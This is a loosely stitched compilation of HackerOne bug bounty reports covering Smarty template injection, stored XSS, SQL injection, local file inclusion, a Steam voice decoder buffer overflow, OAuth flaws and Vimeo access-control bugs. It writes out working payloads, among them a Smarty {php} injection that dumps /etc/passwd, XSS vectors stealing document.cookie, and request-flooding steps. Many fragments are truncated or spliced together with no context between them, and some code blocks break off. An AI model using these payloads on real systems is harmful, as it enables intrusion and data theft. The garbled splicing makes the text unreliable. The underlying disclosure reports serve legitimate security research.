It appears as though you are using smarty on the backend for templating. Entering a malicious payload as my firstname, lastname and nickname and then inviting a user to join the site results in the code being executed.
To start, I began with the payload {7*7} and received a template error in the email I received Image F115749: ssti_rce_initial_payload_error.png 33.59 KiBZoom in Zoom out Copy Download Recognizing the injection, I then was able to confirm the version of smarty used via {$smarty.version} {F115750} Next I was able to test {php} tags by using {php}print ""Hello""{/php} {F115751}. Finally I used file_get_contents to begin extracting the etc/pass file {php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php} Image F115752: ssti_rce_etc_passwd.png 23.59 KiBZoom in Zoom out Copy Download
Steps to reproduce

Edit your profile
Add the payload {php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php} as your first name, last name and user name (I'm not sure which field is vulnerable)
Invite a friend using another email of yours
View the email and you will see part of the etc file dumped

Vulnerability
Since the {php} tags are being parsed and executed, we can execute php functions. In this case, you'll see I'm able to extract the etc/passwd file. While I haven't tried, an attacker can more than likely create a shell on the server.
Please let me know if you have any questions.

Impact

Log any victim into the attacker account, the attacker can create a similar account profile as the victim - with some information missing, and then social-engineering (e.g. email) user to provide personal information or current password and can also monitor the victim activities. 
Also the victim may add his paymet info in the attackers account unknowingly using your wallet feature.

Description: [Unikrn does not change session id after password is changed. Reusing same session ids, after password is changed is highly risky.
Example scenario: Hacker has successfully brute forced the password of a victim and has access to the account. The victim notices that something's off and chooses to change the password of the account. Hacker has still full access to the account, even after the password is changed, because of the working session id that he got from the server when he logged in to the victim's account.]
Steps To Reproduce:
(Add details for how we can reproduce the issue)

[Intercept requests when logged in to unikrn and retrieve current session id]
[Change the password of the user]
[Do the step 1 again and compare the session id]

There are character length restrictions on this action, however it's not bound to a specific set of characters. Even so, I was able to include an external script that I URL shortened to just hit the character limit exactly. I was lucky I didn't need to add the closing script tag, because the one at the end of the line takes care of it. I wanted to get a full PoC rather than an alert(1), because I think it could have been argued that the space was too small to actually do anything meaningful with.
This attack is similar in the way to #246806, except I'm quite confident this will be executed on admin panels and anywhere else a UUID is displayed, since sanitization on that attribute is highly unlikely.

Urban Company,1001-5000,0.0,No value,$50.00,Low,2.0,Violation of Secure Design Principles,Broken Link on Urban Company's Vulnerability Submission Form,"awararesearcher  submitted a report to Urban Company.Jun 21st (about 1 year ago)Summary:

Urban Company has an unclaimed broken link on their HackerOne security page which can be claimed by any malicious user. And then later the malicious user can exploit this issue to deceive new researchers to submit their legitimate findings to the wrong hands.

Steps To Reproduce:
1.Visit https://hackerone.com/urbancompany/reports/new?type=team&report_type=vulnerability
2.Click on Security Page.
3. The Security Page points to https://hackerone.com/urbanclap but the URL gives a 404.
4.So, I've impersonated your identity by forming a fake account named 'Security page takeover by awararesearcher' on that link. Here just for the PoC purpose, I've taken over that broken link by making an account with that username and added some context to show what impact can be made. Also, I'll surely release that username after your response.
Reference

https://edoverflow.com/2017/broken-link-hijacking

Impact

New researchers can be further deceived if they clicked on that hijacked link.
For Example a specific case might be: A malicious user can create a fake account on that broken redirection link and can deceive researchers arriving on that link. For example, the attacker can ask the researcher to submit his report to him first and if he approves, then only he can submit it to your official page. In this way, it can cause huge damage to your company if a report is critical in any case.
Here I've shown a sample impact by adding some info in that impersonated account.",https://hackerone.com/reports/1239334,No value,No value,No value,2021,6,21,7,3

Valve,251-500,0.0,100m-200m,"$7,500.00",Critical,9.1,Classic Buffer Overflow,Buffer overrun in Steam SILK voice decoder,"slidybat  submitted a report to Valve.Apr 29th (2 years ago)Vulnerability
The SteamWorks SDK has a function available named DecompressVoice(), which takes as input some compressed voice data, and returns the raw audio data.
The format for the input voice data is as follows:
Code 100 BytesWrap lines Copy Download18 bytes - steamid
21 byte - payload type
32 bytes - payload size
4<payload data>
54 bytes - CRC checksum
There are numerous payload types available, including Opus PLC, Opus, SILK, Raw and Silence. The bug being considered here is specific to the SILK decoder.
The pseudo-code for the SILK decoder is:
Code 1.49 KiBWrap lines Copy Download1unsigned int VoiceEncoder_SILK::Decode( const char* pPayloadData, size_t nPayloadSize, char* pDestBuffer, size_t nDestBufferSize )
2{
3	m_decControl.API_sampleRate = m_nSampleRate;
4	int nSamplesInFrame = 20 * m_nSampleRate / 1000;
5	int nBytesInFrame = 2 * nSamplesInFrame;
6	
7	const char* pPayloadCurr = pPayloadData;
8	const char* pPayloadEnd = pPayloadData + pPayloadSize;

10	char* pDestCurr = pDestBuffer;
11	char* pDestEnd = pDestBuffer + nDestBufferSize;
12	
13	while ( pPayloadCurr < pPayloadEnd )
14	{
15		unsigned short nSize = *(short*)pPayloadCurr;
16		pPayloadCurr += 2;
17		if ( nSize == 0xFFFF )
18		{
19			return ( pDestCurr - pDestBuffer ) / 2;
20		}
21		
22		if ( nSize )
23		{

25			if ( pPayloadCurr + nSize > pPayloadEnd )
26				break;
27			
28			//  [2] Make sure we have enough room in output for a full frame
29			if ( pDestCurr + 2 * nBytesInFrame > pDestEnd )
30				break;
31			
32			// Zero out the frame
33			memset( pDestCurr, 0, nBytesInFrame );
34			
35			do
36			{
37				unsigned short nDecodedSamples = ( pDestCurr - pDestBuffer ) / 2;
38				SKP_Silk_SDK_Decode( m_pDecoder, &m_decControl, 0, pPayloadCurr, nSize, pDestCurr, &nDecodedSamples );

41				pDestCurr += 2 * nDecodedSamples;
42				
43				Assert( m_decControl.moreInternalDecoderFrames == 0 ); // [3] We shouldn't get this condition in normal contexts
44			}
45			while ( m_decControl.moreInternalDecoderFrames );
46		}
47		else
48		{
49			pDestCurr += nBytesInFrame;
50		}
51	}
52	
53	return ( pDestCurr - pDestBuffer ) / 2;
54}
Some important things to note:

At [1], a bounds check is performed to ensure we don't read outside the bounds of the input buffer
At [2], a bounds check is performed to ensure we don't write outside the bounds of the output buffer
At [3], an assert is performed that m_decControl.moreInternalDecoderFrames == 0, however, without running with a debugger attached, this assertion is ignored.

The bug has to do with the do/while loop with m_decControl.moreInternalDecoderFrames. Inside the loop, pPayloadCurr and pDestCurr are both incremented, but the bounds checks at [1] and [2] aren't repeated.
This means that if m_decControl.moreInternalDecoderFrames is true, then we can increment pDestCurr past the end of the destination buffer, and overwrite stack data.
Exploiting the vulnerability
For the PoC, I chose to show this bug working in CS:GO, but any service that also uses the DecompressVoice function is also vulnerable. We can use this bug to crash Steam/CS:GO for any players on the server that our voices are transmitted to.
Note that the PoC simply overwrites the stack with garbage data which leads to a crash, however it is entirely possible for an attacker to overwrite the return pointer on the stack with meaningful data that results in RCE. Doing so requires quite a lot of setup work with the payload to get SILK to decode it to a valid ROP chain, so I simply went with the crash for an easier PoC.
One of the challenges to getting this working is to keep the payload size small. CS:GO has a rate-limit on voice data, so the entire voice packet must be kept under 512 bytes.
To accomplish this, we can build a voice payload that does this:

First, set nSize in the payload to 0 multiple times to get pDestCurr closer to pDestEnd (just over 1 frame away).
Next, trigger a call to SKP_Silk_SDK_Decode that also sets m_decControl.moreInternalDecoderFrames to true. At this point, pDestCurr will be incremented by 1 frame, and there will now be less than 1 frame of room in the dest buffer.
Trigger another call to SKP_Silk_SDK_Decode. Since m_decControl.moreInternalDecoderFrames is true, no bounds check is performed. This time there isn't enough room for a frame in the dest buffer and the decode function will overwrite the stack past pDestBuffer.

Attached is a compiled version of a public cheat (CSGOSimple) that adds a console command (send_voice_packet) to send the voice payloads from a file to the server.
A file that implements this payload is attached as voice_payload, which can be fed to the send_voice_packet command to replicate the PoC.
NOTE: Unrelated for replicating the PoC, but this payload is missing the SteamID/CRC data mentioned above. It is expected to be passed into CP2PVoiceSingleton::DecompressVoice() directly, or have the SteamID/CRC added before calling it.
Replication steps
1) Start CS:GO on device A with -insecure launch param and join a server (any empty vanilla server will do, I have one at s1.slidyb.at if needed).
2) Extract CSGOSimple.zip from the attachments onto device A and run injector.exe. Ensure that it has injected into the CS:GO process successfully by checking if the send_voice_packet command exists.
3) Start CS:GO on device B and join the same server.
4) Run send_voice_packet path\to\voice_payload in the CS:GO console on device A, where path\to\voice_payload is the absolute path to the voice_payload file without the C:. For example, if the file as at C:\Users\me\Desktop\voice_payload, then you would use the command send_voice_packet Users\me\Desktop\voice_payload.
5) Steam and CS:GO should both crash on device B.
Impact
This bug affects any service using the SteamWorks DecompressVoice function, which includes Steam itself and most Source engine titles. It can be used on any other client that can hear voice data from the attacker, including on official Valve matchmaking servers in Source games.
In the best case, it is possible for an attacker to utilize the bug as a DoS to crash other clients, and in the worst case it can lead to RCE by using ROP.2 attachments:F1283375: voice_payloadF1283381: CSGOSimple.zip",https://hackerone.com/reports/1180252,Washington,United States,Bellevue,2021,4,29,18,33

Yeah, you can see we can control the value of the field to cause the injection.
As I said in the vulnerability https://hackerone.com/reports/353784.
## Steps to reproduce:
1.The first step is to enable conversations.
2.We register and log in to an account
3.Construct an injection message. The value of TransientKey can be grabbed from a normal POST packet.
The attack packet that I constructed based on error injection is as follows:

 I have found a vulnerability which allows a user who does not have access to a discussion to comment on it and thus avoid the control applied. (http://littleguy.vanillastaging.com/)
Proof Of Concept
For this proof of concept I have used 3 users. User A creates a PRIVATE group and invites user B to join it. Subsequently, user A creates a private discussion.
http://littleguy.vanillastaging.com/discussion/15/
This is the private discussion  between User A and User B, obviously you can't have access

Now user C tries to access this discussion however the following is observed

Greetings!!
Description:
I would like to report a vulnerability that can be used to delete any user’s post by abusing “Report an abuse” function within application. After specific number of reports submitted to server, it automatically deletes that post of user.
Application has functionality where one user can report for abusive post or content of another user. An attacker can send multiple abuse report for the victim’s post from one account to delete user’s post. 
Steps to reproduce:

Login with attacker's credentials in browser and victim’s credentials in incognito mode of browser 
Post some text or other content through victim’s account on his own wall.
Now open attacker’s account and goto victim’s wall or profile. You will see the content posted by victim. 
Set up any proxy intercepting tool with the browser (I’m using Burp Suite) and start intercepting requests
Click on “Flag” of victim’s post and select “Abuse”. Capture this request in Burpsuite and send to Intruder tab
Goto “Position” tab and select “clear”
Now goto Payload tab and select “Payload type” as “Null Payloads”
Under the payload options select “Continue indefinably”
Now goto “Options” tab and set number of threads “100”
Click on start attack. After 900 requests reload the page.
If post is still exist, wait for more payloads to be executed.
After specific number of successful payloads post will get deleted. 
You can verify with attacker’s as well as victim’s account also

Mitigations:
Application should also verify source of ""Abusive flags"". If requests are being submitted from one account, block the requests.
Impact
An attacker can use this vulnerability to delete any user’s post by sending multiple abuse flags to server. Server is not verifying report’s source as it only verifying report’s quantity, so attacker can send multiple reports from one account and get victim’s post deleted.
Attacker can delete multiple posts by abusing this vulnerability in reputed forums and posts which have got high attention or number of likes, LOLs and comments.",https://hackerone.com/reports/411075,Quebec,Canada,Montreal,2018,9,18,13,14

If a user creates a conversations, and then leaves, all API calls and web access to that conversation is locked down. Except for one particular API call which allows you to see details about ongoing conversations you have since left as long as you created the conversation in the first place. 
Steps to reproduce:

Ensure that the ""member"" role has API Token access. 
Create a new user with this role, and send a conversation to anyone. 
Leave said conversation. 
On the web/API calls to read this conversation and message should fail. However you should still be able to do the following API call :
https://vanilla.com:444/api/v2/conversations/?insertuserid=yourUserId&access_token=accessToken
Which leaks details like who has been added to the conversation after you left, extra messages etc. 

Code Details
I noticed that most calls to conversations run through the method inConversation which checks whether a user is still in the conversation, and if they have left they don't have access to it. But I assume this was too heavy to run in this particular API call because it returns a list. 
For this particular API call if you don't pass in the insertuserid param, then it will indeed check the userconversation table and make sure you are still participating in the conversation. But if you pass in insertuserid it instead bypasses this check and just returns all conversations you started, irrespective if you are still in them.

Vanilla,11-50,0.0,under-1m,$150.00,Medium,5.45,Denial of Service,Making further registrations difficult on Vanilla forum,"krishnaverma  submitted a report to Vanilla.Mar 23rd (5 years ago)Summary:
After registering the account, user gets a verification email. There is a number assigned in that mail and it is incremented for next user. Trying to verify the next number with same code shows user not found but will create problem for next person registering the account.
Description:
Steps to reproduce:


Register an account on https://open.vanillaforums.com . I registered with alpesh73768@gmail.com and username alpesh73768


You will get a confirmation mail like https://open.vanillaforums.com/entry/emailconfirm/67421/nSBDdPuH2zdZlRYiYCgvnYJZOUCmZMLE


If you just change the number here 67421 and increment by 1 , url becomes, https://open.vanillaforums.com/entry/emailconfirm/67422/nSBDdPuH2zdZlRYiYCgvnYJZOUCmZMLE  
Load this url in browser and you will get error ""user not found""

Now when next user tries to register on the site he will see this error on registering "" user 67422 not found"".  Adding the image below

Image- Vanilla 1

If he again tries with same details, he will get error:

The name you entered is already used by another member
The email is entered i already used by another member
Image- Vanilla 2.

This user will also get no confirmation email in his email id. Only if he logs in and then sends a verification email again, he will be able to use the account.

Let me know if you need any more information.

There is a stored XSS in the latest version 2.8 of vanilla. Attack with post privileges can trigger this.
Description:
In last report 481360, I found a XSS cause by Format. But in lastest version 2.8, the default Format of Discussion and Comment is Rich. In this Format, we can insert a Link which hasn't be sanitized
Steps to reproduce:

Log in and Click New Discussion
set the title and the content as anything you want
Post Discussion and Intercept request with Burpsuite
Modify the param Body as [{""insert"":""\n""},{""insert"":{""embed-external"":{""data"":{""type"":""link"",""url"":""http://localhost"",""name"":""name"",""body"":""body"",""photoUrl"":""photourl'onerror=alert(1) '"",""timestamp"":""time\""onmouseover=alert(2) \"""",""humanTime"":""humentime""}}}}]
the the XSS vector will be triggered

Anything else we should know?
Code Analysis
the root cause is in \library\Vanilla\Formatting\Embeds\LinkEmbed.php  
Code 771 BytesWrap lines Copy Download1    public function renderData(array $data): string {

There is a stored XSS in the latest version 2.6.4 of vanilla.  Attack with post privileges can trigger this.
Description:
This is a feature that user can post content in  markdown format. And the content and format type is inserted into database without check the format param. So attack can modify the format type. When the milicious content render by Gdn_format::to($content, $format), it will bypass the XSS filter.
File library/core/class.format.php
Code 538 BytesWrap lines Copy Download1    public static function to($mixed, $formatMethod) {
2        // Process $Mixed based on its type.
3        if (is_string($mixed)) {
4            if (in_array(strtolower($formatMethod), self::$SanitizedFormats) && method_exists('Gdn_Format', $formatMethod)) {
5                $mixed = self::$formatMethod($mixed);
6            } elseif (function_exists('format'.$formatMethod)) {
7                deprecated('format'.$formatMethod, 'gdn_formatter_'.$formatMethod, '2015-10-26');
8                $formatMethod = 'format'.$formatMethod;
9......
So when we set the format as 'String', it will call function formatString in functions.general.php. This function will not filter xss vector.
Steps to reproduce:

Log in and Click New Discussion
set content as x<img src=x onerror=alert(document.cookie)>x
Post Discussion and  Intercept request with Burpsuite
Modify the param Format as String
the the XSS vector will be triggered

An authenticated admin user can trigger a directory traversal to require call leading to local file inclusion which can allow an attacker to gain remote code execution.
Notes:

You need to have an admin session to run this poc.
You can use the directory traversal to reach outside of the web root
Even though this poc uses the unserialize bug, please note, the underlying root cause is the directory traversal and no check is made on $type.
Don't forget to cleanup the -index.php file in the conf directory
I had to adjust the pop chain slightly and add double digits to the number of properties for the Gdn_ConfigurationSource class otherwise the application will not parse the serialized payload properly. I'm not sure why, haven't bothered to investigate it since I found an easy work around.

Analysis:
Inside of the applications/dashboard/controllers/class.addoncachecontroller.php file, we can see there is a reachable function verify() which accepts a type parameter.

58            }
59        }
60        return $this->singleIndex[$type];
61    }
At [2] we enter the function and at [3] we don't enter the first code block as type is != to Addon::TYPE_ADDON. Then at [4] we call getSingleIndex() using our controlled type. Then at [5] we enter the function, at [6] we set the $cachePath variable which is pre-pended with the attackers string. Then at [7] we land in a check if the file path is readable, and if it is, we trigger a file inclusion using require.
Note that there is no protection here for traversals and as such, a remote, context dependent attacker can leverage this for rce. However, this bug requires that an attacker has the following primitive:

They can upload a file in any directory with the name ""*-index.php"" containing some PHP code.

Whilst this sounds rare, actually, it's very possible to do this on most applications. Since Vanilla doesn't allow this by default, I have marked this bug as a medium (not high), but you should be extra careful regarding inclusion functions.
Exploitation:
As stated above, we need a write primitive to write an *-index.php file somewhere on the filesystem with our code. So I leveraged the unserialize() vulnerability from a previous report to get that primitive.
Then, I used the file inclusion and traversed a single directory into the conf directory. Note the traversals here, thats the underlying issue

As mentioned above, the value of $where is controllable by us and can be an array.
This means that we can control the field name in the where statement.
So we can fill in the field name in the SQL injection statement.
Follow-up operation will not say much.
## Steps to reproduce:
1.The exploit requires users to log in. We can log in as an ordinary user.
2.The POST method is required to access the deleteInvitation function. Due to the existence of the TransientKey, we cannot directly send a POST request.But we can get TransientKey by other means. For example, grab a normal POST message and change it to a vulnerability URL.
3.Here I use delay injection, using the benchmark function in mysql. Different environment delay time is not the same.

Vanilla,11-50,0.0,under-1m,$150.00,Medium,4.3,Information Disclosure,Web cache deception attack on https://open.vanillaforums.com/messages/all,"ronr  submitted a report to Vanilla.Jun 1st (3 years ago)I have found a Vulnerability in vanilla forums which called Web cache deception attack.
Web Cache Deception Attack
Websites often tend to use web cache functionality to store files that are often retrieved, to reduce latency from the web server.
Websites often tend to use web cache functionality (for example over a CDN, a load balancer, or simply a reverse proxy). The purpose is simple: store files that are often retrieved, to reduce latency from the web server.
When accessing a URL like http://www.example.com/home.php/non-existent.css
A GET request to that URL will be produced by the browser.  The server returns the content of http://www.example.com/home.php. And yes, the URL remains http://www.example.com/home.php/non-existent.css. The HTTP headers will be the same as for accessing http://www.example.com/home.php directly: same caching headers and same content type (text/html, in this case).
The web cache servre saves the returned page in the server's cache. Then the attacker can go to the url: http://www.example.com/home.php/non-existent.css and the page of the victim will be presented with the victim's sensitive information (The page content).
The dangerous part in this attack, unlike phishing attacks, is that the url isn't looks suspicious at all.  It looks like a normal url from the original website, so the victim thinks that it is ok to click on the link.
Steps:

The attacker sends the following link to the victim: https://open.vanillaforums.com/messages/all/non-existent.css
The victim opens the link and the inbox page will be loaded normally. (The web cache server then saves this page)
The attacker open the same link (https://open.vanillaforums.com/messages/all/non-existent.css), and the inbox page of the victim with all his private contant is loaded.

If you need a video to understand it better, ask me and I will send you one.
Impact
The attacker can achieve all the private content of a specific victim, without the victim knowing about it.",https://hackerone.com/reports/593712,Quebec,Canada,Montreal,2019,6,1,17,27
Vanilla,11-50,0.0,under-1m,$300.00,High,7.1,Cross-site Scripting (XSS) - Stored,XSS For Profile Name,"mindingdata  submitted a report to Vanilla.Aug 15th (3 years ago)Summary:
In short, if your username is something as simple as <script>alert(1)</script> this will not be filtered when viewing your profile page. The unfiltered script alert is echo'd underneath your image in your profile. This can be viewed by anyone viewing your profile (Although in some cases the browser will attempt to block it so you might not see it immediately - but it will show in the console etc).
While you are unable to change your username to have <> tags via the web, I noticed if I edited the name directly in the database I could get it to prompt. 
From there I found two ways to make your name accept tags. 

via the API, you can create a user with a script tag as a name and it goes through fine. 
via social logins. Although Facebook, Twitter and Google all block <> tags in their ""Name"" field, things like Github and Steam do not and the social login plugins take the ""name"" wholesale without any filtering. 

Description:
Steps to reproduce:
You can ofcourse just edit the name of a user in the gdn_user table if you want to short circuit it. Otherwise... 

Call the API (Even via Swagger in the admin panel) with the following : (RoleId may need to be changed to suite local install)

{
""bypassSpam"": false,
""email"": ""test@test.com"",
""emailConfirmed"": true,
""name"": ""<script>alert(1)</script>"",
""password"": ""P@ssw0rd"",
""photo"": """",
""roleID"": [
8
]
}

Login as this user/view this users profile via the front end web. You should see the alert. 

(And again alternatively you can set up OpenID/Social Logins with a provider that also allows script tags in the name and it will come through also)
Anything else we should know?
While the web does block it so the exploit relies on either an API integration or a social login, I think relying on third parties to block script tags on their end so they don't get into the Vanilla DB is probably pretty dangerous. If Vanilla has inbuilt support for something like Github this would be a much larger problem etc.

Vimeo,1001-5000,0.0,50m-100m,$250.00,No value,0.0,Improper Authentication - Generic,Ability to Download Music Tracks Without Paying (Missing permission check on`/musicstore/download`),"wkcaj  submitted a report to Vimeo.Jan 14th (8 years ago)Hello,
I'm not sure how serious this is to be honest. If you're downloading tracks without paying, then I'm sure you could find a copy somewhere on the internet anyway. But I guess it's still an issue.
When browsing the Music Store (https://vimeo.com/musicstore), some tracks are free. To download these, a GET request is sent to /musicstore/download, with a query string of track_id=[track_id]&license_id=4.
For non-free tracks, the link is replaced with an Add to Cart icon, and you're expected to go through the checkout procedure. This is done by a POST request to /cart/musicwith a body of action=add&license_id=2&license_name=Personal&price=1.99&track_id=110947&track_title=Remind%2BMe&uid=110947_2&&&token=[token].
Copying the track_id from the Add to Cart request and transplanting it into the /musicstore/download successfully redirects you to Amazon S3 to download the track, despite you not having paid for it.
Note: I submitted the GET request to /musicstore/download, but didn't follow the 302 redirect to S3 to download the track since I didn't pay for it. Because of this I can't 100% verify that the resulting file is the track, but judging by the URL it looks like it is.
Proof-of-Concept
Accounts Needed

User #1 - Standard Vimeo user

Steps

Login, and browse to https://vimeo.com/musicstore
Find a non-free track, and click the Add to Cart icon
Inside the POST request to /cart/music copy the track_id
Browse to the following URL, replacing [track_id] with the one from step 3. You should be redirected to S3 to download the track (without paying): https://vimeo.com/musicstore/download?track_id=[track_id]&license_id=4

I changed the value of clip_id parameter to another video id to test some authorization flaw ,it seem it works because i got HTTP/1.1 200 OK  and i short json response that contain a url, like this one

To confirm this is a authorization flaw i make a another account and upload a private video in that account and get the clip_id, then make a request(https://vimeo.com/upload/select_thumb) to  my attacker account using that clip_id. as a result i got some thumbnails on a private video 
if you want to get the whole video just iterate the time parameter! i think it is useful to include some request

Brief
The profile picture upload feature at https://vimeo.com/settings/profile contains a bug where an access control is missing for uploading a profile picture to a profile ID. This leads to the possibility of uploading a profile picture to any account on Vimeo. Furthermore, since the upload doesn't have any rate limiting, it would in theory be possible to add a picture to every Vimeo account that exists (since the profile IDs are incremental).
PoC

Set up an intercepting proxy so that you can edit requests/responses to Vimeo
Visit https://vimeo.com/settings/profile
Click the ""Upload"" button
Choose any image
If you did everything correct, your browser should now send a request to /upload/_get_image_url with 2 post parameters. One of them is called ""id"". Change this id to another profile id then forward the request.
Your uploaded picture is now added to the other profile!

Remediation
The profile picture upload function should only work for the currently logged in users profile ID.

Brief
I have discovered a way to issue API calls on behalf of other users. The problem stems from the fact that the API playground at https://developer.vimeo.com/api/playground/me has a very weak CSRF protection. The only thing protecting this resource from CSRF attacks is the demand that the ""X-Requested-With: XMLHttpRequest"" request header is present on the call.
At first sight, this seems impossible to circumvent because sending AJAX requests cross-domain is blocked by CORS, but there is a way to spoof the ""X-Requested-With"" request header in Flash.
I have only created a proof-of-concept for Safari (tested on newest version on OSX), but there is a big chance that this is possible from other browsers (and other plugins) too.
PoC

Log in to Vimeo in Safari
Visit https://s3.amazonaws.com/avlidienbrunn/vimeo_pwn.swf
Your profile biography now says ""avlidienbrunn+was+here""

Video demonstration
I have made a Video explaining the issue, but at the time of writing this I am still uploading it to Vimeo (I will put a password on it and attach it to a comment).
Technical details
It's possible to send the ""X-Requested-With"" header with Flash, but we can't send it cross-domain due to the SOP implementation with Adobe's crossdomain.xml files. However, we can trick Flash into sending the request anyway by issuing the request to a domain that does allow it, which in turn sends a HTTP 307 redirect to the resource that we want to target. Flash will send the request to the new resource before requesting crossdomain.xml on the new domain.

Safari requests https://s3.amazonaws.com/avlidienbrunn/vimeo_pwn.swf
SWF requests https://avlidienbrunn.se/crossdomain.xml
SWF requests https://avlidienbrunn.se/vimeo_pwn.php (issues 307 redirect to Vimeo API playground)
SWF requests https://developer.vimeo.com/api/playground/me (including the X-Requested-With header)
SWF requests https://developer.vimeo.com/crossdomain.xml

Since it's step #4 that issues the API call, we can make the currently logged in user issue the call regardless of the crossdomain.xml file. We can, however, not read the response from the API call.

Vimeo,1001-5000,0.0,50m-100m,$500.00,No value,0.0,Improper Authentication - Generic,API: missing invalidation of OAuth2 Authorization Code during access revocation causes authorization bypass,"dor1s  submitted a report to Vimeo.Apr 21st (8 years ago)OAuth2 API makes it possible for users to grant access to their accounts to some third-side applications. Of course, users are able to manage such applications' access to their accounts and may deny access for any application. When some user denies access for the application, all access_tokens are being revoked and become invalid. But not only access_tokens should be revoked, authorization codes (it is intermediate token used in OAuth2 Authorization Flow) must be revoked too. Vimeo OAuth2 API implementation does not revoke authorization code during access revocation. It may be exploited to restore access to user's account by malicious application after access revocation.
Proof of Concept
(all scripts used are attached)
1) Open the link for OAuth2 authorization for some application. Example link for my test application (Dor1s Test1, feel free to use my test application to reproduce the issue):
Code 183 BytesWrap lines Copy Download1https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef
2) Log into your Vimeo account (if needed) and click Allow
3) Copy code value from callback url, for example:
Code 95 BytesWrap lines Copy Download1https://avuln.com/callback?state=0123456789abcdef&code=e1fa87cd449ae55b74445b31ac79450c14eeb657
code value is e1fa87cd449ae55b74445b31ac79450c14eeb657
4) Use code value to obtain access_token:
Code 253 BytesWrap lines Copy Download1doris$ ./getAccessToken.sh e1fa87cd449ae55b74445b31ac79450c14eeb657
2{
3    ""access_token"": ""d3ac3bb53d1c4ebc3de7d28e4ed801c0"",
4    ""token_type"": ""bearer"",
5    ""scope"": ""public private"",
6    ""user"": {
7        ""uri"": ""/users/39285903"",
8<... CUT OUT ... >
9}
5) Check validity of access_token:
Code 506 BytesWrap lines Copy Download1doris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0

6) Repeat step 1. Link for my test application:
Code 183 BytesWrap lines Copy Download1https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef
7) Repeat step 2. Log into your accounts (if needed) and click Allow.
Note: it is not hard to imagine an application requiring user to pass authentication one more time. Many applications do not store long-term sessions and force users to login/authorize every day or even often.
Note 2: often OAuth providers allow to use approval_prompt=auto parameter, which makes this step does not require user to click Allow again. I had not found such possibility for Vimeo API, but if it is possible, in such case malicious application just need to place on its web-site (or whenever in the Internet) something like that:
Code 211 BytesWrap lines Copy Download1<html>
2	<img src=""https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef"">
3</html>
such code will ""silently"" produce new access_token value to callback each time it has been loaded by the user.
8) Copy code value from callback url and save it for future usage:
Code 95 BytesWrap lines Copy Download1https://avuln.com/callback?state=0123456789abcdef&code=82e24f835184f47cd83f249907e7bd5018bf62c9
code value is 82e24f835184f47cd83f249907e7bd5018bf62c9
9) Go to account security settings https://vimeo.com/settings/apps
10) Disconnect the application (Dor1s Test1 if my test application used) from Apps section
11) To ensure that access is denied, repeat step 5:
Code 565 BytesWrap lines Copy Download1doris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0

Impact
The vulnerability allows an malicious application to keep its access active to a victim's account even after access revocation. This is not only authorization bypass, but it also deprives a victim ability to manage access for an application.
Mitigation
For access revocation processing all authorization code issued for certain pair of user and application should be invalidated (as it currently being done for access_token values).2 attachments:F35603: getAccessToken.sh.txtF35604: me.sh.txtdashron   posted a comment. Apr 24th (8 years ago)I've been digging through the code, and it looks like we delete the authorization codes immediately when we generate an access token. 
When I try your steps (using your very curl commands, but newly created app credentials on a new user), step 12 returns a 400 error with the body
{
""error"": ""invalid_request"",
""error_description"": ""Invalid authorization code""
}.
Do you have a more-streamlined process that reproduces this error? We don't support approval_prompt=auto, so you can leave that whole section out.dor1s   posted a comment. Apr 25th (8 years ago)Hi dashron,
Thanks for the reply. Excuse me, but are you sure that while reproducing step 12 you are using code value from step 8?
I think there is no more-streamlined process. Simplified idea of the PoC is:
If an application got additional code value, it may obtain access_code even after access revocation by user.
I just repeated steps 6-13 several times and code was always valid for me. However I can record a screencast for the Proof of Concept.
It is good that you do not support approval_prompt=auto, let's ignore Note 2 on step 7.
Notice
You just said that:
Code 133 BytesWrap lines Copy Download1I've been digging through the code, and it looks like we delete the authorization codes immediately when we generate an access token.
Actually it is not exactly so. There you have Race Condition bug for exchanging code for access_token. One code value may be exchanged for several access_token values and all of them would be valid.
You can reproduce it with script attached. Please note that Race Condition is probabilistic vulnerability. It may be needed to do few attempts with PoC to reproduce it.
I did not reported Race Condition as separate bug, because there is no serious impact to security (when access is revoked, all access_token values become invalid). But such behavior violates OAuth2 RFC:
1) https://tools.ietf.org/html/rfc6749#section-4.1.2 :
Code 307 BytesWrap lines Copy Download1                        If an authorization code is used more than
2   once, the authorization server MUST deny the request and SHOULD
3   revoke (when possible) all tokens previously issued based on
4   that authorization code.  The authorization code is bound to
5   the client identifier and redirection URI.
2) https://tools.ietf.org/html/rfc6749#section-10.5 :
Code 310 BytesWrap lines Copy Download1   Authorization codes MUST be short lived and single-use.  If the
2   authorization server observes multiple attempts to exchange an
3   authorization code for an access token, the authorization server
4   SHOULD attempt to revoke all access tokens already granted based on
5   the compromised authorization code.
and sometimes Race Condition may cause some logical flaws, so it would be better to fix too.1 attachment:F36071: accessTokenRaceConditionPOC.sh.txtdashron   posted a comment. May 1st (8 years ago)Oh I see now. Somehow I misread this at first as you could exchange an auth code for an access token twice.
You believe that the ""disconnect from <app>"" flow should also wipe out all authorization codes for that app.

There is a vulnerability in https://vimeo.com/[VIDEO_ID]?action=share that makes all Vimeo private videos available to anybody.
POC link :
http://opnsec.com/vimeo/vl/videoLeak.php?video=[VIDEO_ID]
POC requirements :

No need to be logged in Vimeo
Because of sensitivity of this, I put a password on the POC :
username : vimeo
password : aS3cr3tP4$$wrD7854123

POC instructions :

Open the POC link replacing [VIDEO_ID] by any Vimeo private video id (I believe all type of private videos are vulnerable)
Enter the username and password as per requirements 
If the Vimeo video id is correct, no matter the status of the video, the video should start playing.


Technical description :
https://vimeo.com/[VIDEO_ID]?action=share is an Ajax link used to ask Vimeo for the ""Share"" code to embed the video
Because it is Ajax, the server is only replying if the Header X-Requested-With is set to XMLHttpRequest.
If the Attacker send this request with a [VIDEO_ID] of a private video that he don't have access to, the server reply with an error message. However, this message contains the link to the config file of the private video including a token parameter s=[SECRET] which will grant the attacker access to the config file.
